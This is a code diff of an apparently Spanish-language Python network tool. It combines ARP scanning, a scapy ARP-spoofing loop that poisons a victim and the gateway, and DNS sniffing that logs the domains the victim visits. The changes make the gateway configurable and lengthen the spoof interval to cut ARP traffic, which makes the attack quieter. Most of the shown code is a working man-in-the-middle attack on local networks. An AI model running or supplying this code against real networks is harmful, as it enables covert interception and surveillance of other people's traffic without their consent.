@@ -110,7 +110,6 @@ def aguila_dominios_https():
         ''')
 
     def scannerARP():
-
         def scan(ip):
             answered_list, _ = scapy.arping(ip, verbose=0)  
             print("\n IP Address\t   MAC Address\t\tHostname")
@@ -130,22 +129,12 @@ def aguila_dominios_https():
 
         main()
 
-    def get_my_mac(interface):
-        try:
-            return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
-        except ValueError:
-            print(colored(f"\n[!] La interfaz {interface} no es válida o no está disponible.\n", "red"))
-            return None
-        except KeyError:
-            print(colored(f"\n[!] No se pudo obtener la MAC para la interfaz {interface}. Asegúrate de que está activa.\n", "red"))
-            return None
-
     def spoof(target_ip, gateway_ip, my_mac, victim_mac):
         while True:
             try:
                 scapy.send(scapy.ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=victim_mac, hwsrc=my_mac), verbose=False)
                 scapy.send(scapy.ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=my_mac), verbose=False)
-                time.sleep(2)
+                time.sleep(10)  # Cambiado de 2 a 10 segundos para reducir el tráfico ARP
             except KeyboardInterrupt:
                 print(colored("\n[!] Terminando el programa...", "red"))
                 break
@@ -156,7 +145,7 @@ def aguila_dominios_https():
     def process_dns_packet(packet):
         if packet.haslayer(scapy.DNSQR):
             dominio = packet[scapy.DNSQR].qname.decode()
-            exclusion_palabras = ["google", "cloud", "bing", "static", "beacons", "fontawesome", "protechts", "video-weaver", "pdx01", "cookiebot", "dof6", "geolocation", "public", "img", "w3", "goog", "delivery", "events", "microsoft", "browser", "ajax" ]
+            exclusion_palabras = ["google", "cloud", "bing", "static"]
             if dominio not in dominios_vistos and not any(palabra in dominio for palabra in exclusion_palabras):
                 dominios_vistos.add(dominio)
                 print(f"[+] Dominio: {dominio}")
@@ -177,24 +166,22 @@ def aguila_dominios_https():
 
         while True:
             my_interface = input('¿En qué interfaz de red estás? ')
-            my_mac = get_my_mac(my_interface)
-            if my_mac is not None:
-                break  # Sale del bucle si la MAC es válida
+            my_mac = scapy.get_if_hwaddr(my_interface)
+            if my_mac:
+                break
             else:
                 print("[!] Introduce una interfaz válida.\n")
-        
+
+        gateway_ip = input("Introduce la dirección IP del gateway/WiFi: ")
+
         # Start ARP spoofing in a separate thread
-        threading.Thread(target=spoof, args=(target_ip, "192.168.1.1", my_mac, victim_mac), daemon=True).start()
+        threading.Thread(target=spoof, args=(target_ip, gateway_ip, my_mac, victim_mac), daemon=True).start()
         
         # Start DNS sniffing in a separate thread
         sniff_dns(my_interface)
         signal.signal(signal.SIGINT, signal_handler)
 
-
-    if __name__ == '__main__':
-        main()
-
-
+    main()
 
 # ---------------------------Aguila-https-Arriba------------------------------------------
 
